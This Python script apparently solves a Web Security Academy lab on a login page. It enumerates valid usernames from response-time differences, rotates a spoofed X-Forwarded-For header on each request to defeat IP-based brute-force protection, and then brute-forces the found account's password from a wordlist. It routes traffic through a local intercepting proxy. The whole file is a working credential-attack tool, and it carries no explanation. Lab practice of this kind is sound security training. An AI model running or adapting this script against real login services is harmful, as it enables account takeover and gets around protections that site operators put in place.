import requests
import warnings

from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

username_file='username.txt'
password_file='passwords.txt'
target_url='https://0a420061032ba077c1a253c6009d00db.web-security-academy.net/login'
headers={'X-Forwarded-For':'500'}
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def user_enum():
    with open(username_file,'r') as f:
        for username in f.read().split("\n"):
            headers['X-Forwarded-For'] = str(int(headers['X-Forwarded-For'].split('.')[0]) + 1)
            data={"username" : username ,"password":"passwordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpasswordpassword"}
            response=requests.post(url=target_url,data=data,headers=headers,json=data,proxies=proxies,verify=False)
            if response.elapsed.total_seconds() > 1:
                print(f"{username} is suspicious username.This requests' response time is: {response.elapsed.total_seconds()}")
                brute_pass(username)
                break
            print(f"username: {username} response time is : {response.elapsed.total_seconds()}")
def brute_pass(username):
    with open(password_file, 'r') as f:
        for password in f.read().split("\n"):
            headers['X-Forwarded-For'] = str(int(headers['X-Forwarded-For'].split('.')[0]) + 1)
            data={"username":username,'password':password}
            response=requests.post(url=target_url,data=data,headers=headers,proxies=proxies,verify=False)
            if "Invalid username or password" not in response.text:
                return print(f"{username} : {password} [Logged in,Congrats!!!] {response.status_code}")
                break
            else:
                print(f"{username} : {password} [Not Logged] {response.status_code}")



if __name__ == "__main__":
    user_enum()